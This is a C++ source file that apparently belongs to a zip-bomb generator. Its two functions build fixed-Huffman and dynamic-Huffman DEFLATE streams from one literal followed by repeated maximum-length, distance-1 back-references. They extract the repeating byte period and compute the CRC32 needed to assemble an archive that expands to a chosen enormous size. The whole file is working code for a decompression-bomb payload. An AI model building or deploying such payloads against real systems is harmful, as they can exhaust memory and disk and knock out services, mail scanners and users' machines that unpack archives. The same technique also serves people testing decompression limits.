//
// Created by LeeEeZian on 30/9/2026.
//
#include "factory/PayloadFactory.h"
#include "deflation/lz77.h"
#include "deflation/BitWriter.h"
#include "Timer.h"
#include "zip_file_construction/LocalFileHeader.h"
#include <chrono>
#include <iostream>
#include <numeric>
#include <cmath>
#include <unordered_map>

payloadFactory::CreateBombPayloadResult payloadFactory::createFixedBombPayload(const size_t size) {
    using namespace lz77;
    BitWriter writer;

    writer.add(HuffmanTable::BFINAL::YES, 1);
    writer.add(HuffmanTable::BTYPE::FIXED_HUFFMAN, 2);

    auto [code, length]{HuffmanTable::fixedSymbolTable('a')};

    const int headerBitLength{3 + length};

    writer.add(code, length);

    constexpr int bytesToCopy{static_cast<int>(lz77::LengthValue::MAX)};

    const MatchCode lengthCode{lz77::getLengthCode(bytesToCopy)};
    const MatchCode distanceCode{lz77::getDistanceCode(1)};

    auto [lCode, lLength]{HuffmanTable::fixedSymbolTable(lengthCode.symbol)};
    auto [dCode, dLength]{HuffmanTable::fixedDistanceTable(distanceCode.symbol)};

    const int totalRepeatableBits{lLength + dLength + lengthCode.extraBit + distanceCode.extraBit};

    const int bytesTillRepeat{std::lcm(8, totalRepeatableBits) / 8};
    const int iterationsTillRepeat{std::lcm(8, totalRepeatableBits) / totalRepeatableBits};

    for (size_t i{}; i < iterationsTillRepeat * 2; ++i) {
        writer.add(lCode, lLength);
        writer.add(lengthCode.extraValue, lengthCode.extraBit);

        writer.add(dCode, dLength);
        writer.add(distanceCode.extraValue, distanceCode.extraBit);
    }

    auto [endCode, endLength]{HuffmanTable::fixedSymbolTable(HuffmanTable::END_OF_BLOCK)};
    writer.add(endCode, endLength);

    std::vector<uint8_t> all{writer.release()};

    const long long periodStart{((headerBitLength + bytesTillRepeat * 8) / 8)};

    const std::vector<uint8_t> start{all.begin(), all.begin() + periodStart};
    std::vector<uint8_t> period{all.begin() + periodStart, all.begin() + periodStart + bytesTillRepeat};
    std::vector<uint8_t> end{all.begin() + periodStart + bytesTillRepeat, all.end()};


    const size_t totalIterations = 4 * size;
    const size_t numberOfPeriods = totalIterations / iterationsTillRepeat;

    const size_t remainingPeriods{numberOfPeriods - 1};

    const size_t repeatedData{4 * size * bytesToCopy};

    const size_t uncompressedSize{repeatedData + 1};

    Timer CrcCalculation{"Crc32 calculation"};

    Crc32 BombCrc32{};

    Crc32 block{};
    block.update('a');
    block.computeCrc32();

    size_t remaining{uncompressedSize};
    while (remaining) {
        if (remaining & 1) {
            BombCrc32.combine(block);
        }

        block.combine(block);
        remaining >>= 1;
    }

    const size_t compressedSize{start.size() + period.size() * remainingPeriods + end.size()};

    return {
        .bombRecipe = {
            .start = start, .period = period, .end = end, .kbSize = size, .numberOfPeriods = remainingPeriods
        },
        .uncompressedSize = uncompressedSize, .compressedSize = compressedSize, .crc32 = BombCrc32.getCrc32()
    };
}


payloadFactory::CreateBombPayloadResult payloadFactory::createDynamicBombPayload(const size_t size) {
    using namespace lz77;
    BitWriter writer;
    writer.add(HuffmanTable::BFINAL::YES, 1);
    writer.add(HuffmanTable::BTYPE::DYNAMIC_HUFFMAN, 2);
    int headerBitLength{3};

    const uint8_t HLIT{29}; // 286-257, 5 bits
    const uint8_t HDIST{0}; // 1-1, 5 bits
    // The number of slots used for the creation of the third table
    const uint8_t HCLEN{14}; // 18-4, 4 bits

    writer.add(HLIT, 5);
    writer.add(HDIST, 5);
    writer.add(HCLEN, 4);
    headerBitLength+= 14;
    std::array<int, 19> codeLengthTableOrder{16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15};

    std::array<int, 19> codeLengthTable{};
    codeLengthTable[18] = 0b001;
    codeLengthTable[2] = 0b010;
    codeLengthTable[1] = 0b010;

    for (size_t i{}; i < HCLEN+4; ++i) {
        writer.add(codeLengthTable[codeLengthTableOrder[i]], 3);
        headerBitLength+=3;
    }

    // Instruction stream
    std::unordered_map<int, int> clcCodeReversed{{18, 0}, {2, 0b11}, {1, 0b01}};
    struct ClcInstruction {
        int symbol;
        int symbolLength;
        int extraBits;
        int extraValue;
    };

    // 18(97),2,18(138),18(20),2,18(28),1,1
    std::array<ClcInstruction, 8> instructions{
        {
            {18,1, 7, 86}, // 97 zeros   (slots 0–96)
            {2, 2,0, 0}, // slot 97  = len 2
            {18,1, 7, 127}, // 138 zeros  (slots 98–235)
            {18,1, 7, 9}, // 20 zeros   (slots 236–255)
            {2, 2,0, 0}, // slot 256 = len 2
            {18,1, 7, 17}, // 28 zeros   (slots 257–284)
            {1, 2,0, 0}, // slot 285 = len 1
            {1, 2,0, 0}, // distance slot 0 = len 1
        }
    };

    for (const auto &[symbol, symbolLength, extraBits, extraValue]: instructions) {
        writer.add(clcCodeReversed[symbol], symbolLength);
        writer.add(extraValue, extraBits);
        headerBitLength+=symbolLength+extraBits;
    }

    uint16_t reversedLiteralSymbolCode{0b01};
    uint8_t literalSymbolLengthCode{2};
    headerBitLength+=literalSymbolLengthCode;

    writer.add(reversedLiteralSymbolCode, literalSymbolLengthCode);

    constexpr int bytesToCopy{static_cast<int>(lz77::LengthValue::MAX)};


    const MatchCode lengthCode{lz77::getLengthCode(bytesToCopy)};
    const MatchCode distanceCode{lz77::getDistanceCode(1)};

    uint16_t lCode {0};
    uint8_t lLength {1};

    uint16_t dCode {0};
    uint8_t dLength {1};

    uint16_t endCode {0b11};
    uint8_t endLength {2};

    const int totalRepeatableBits{lLength + dLength + lengthCode.extraBit + distanceCode.extraBit};

    const int bytesTillRepeat{std::lcm(8, totalRepeatableBits) / 8};
    const int iterationsTillRepeat{std::lcm(8, totalRepeatableBits) / totalRepeatableBits};

    for (size_t i{}; i < iterationsTillRepeat * 2; ++i) {
        writer.add(lCode, lLength);
        writer.add(lengthCode.extraValue, lengthCode.extraBit);

        writer.add(dCode, dLength);
        writer.add(distanceCode.extraValue, distanceCode.extraBit);
    }

    writer.add(endCode, endLength);

    std::vector<uint8_t> all{writer.release()};

    const long long periodStart{((headerBitLength + bytesTillRepeat * 8) / 8)};

    const std::vector<uint8_t> start{all.begin(), all.begin() + periodStart};
    std::vector<uint8_t> period{all.begin() + periodStart, all.begin() + periodStart + bytesTillRepeat};
    std::vector<uint8_t> end{all.begin() + periodStart + bytesTillRepeat, all.end()};


    const size_t totalIterations = 4 * size;
    const size_t numberOfPeriods = totalIterations / iterationsTillRepeat;

    const size_t remainingPeriods{numberOfPeriods - 1};

    const size_t repeatedData{4 * size * bytesToCopy};

    const size_t uncompressedSize{repeatedData + 1};

    Timer CrcCalculation{"Crc32 calculation"};

    Crc32 BombCrc32{};

    Crc32 block{};
    block.update('a');
    block.computeCrc32();

    size_t remaining{uncompressedSize};
    while (remaining) {
        if (remaining & 1) {
            BombCrc32.combine(block);
        }

        block.combine(block);
        remaining >>= 1;
    }

    const size_t compressedSize{start.size() + period.size() * remainingPeriods + end.size()};

    return {
        .bombRecipe = {
            .start = start, .period = period, .end = end, .kbSize = size, .numberOfPeriods = remainingPeriods
        },
        .uncompressedSize = uncompressedSize, .compressedSize = compressedSize, .crc32 = BombCrc32.getCrc32()
    };
}
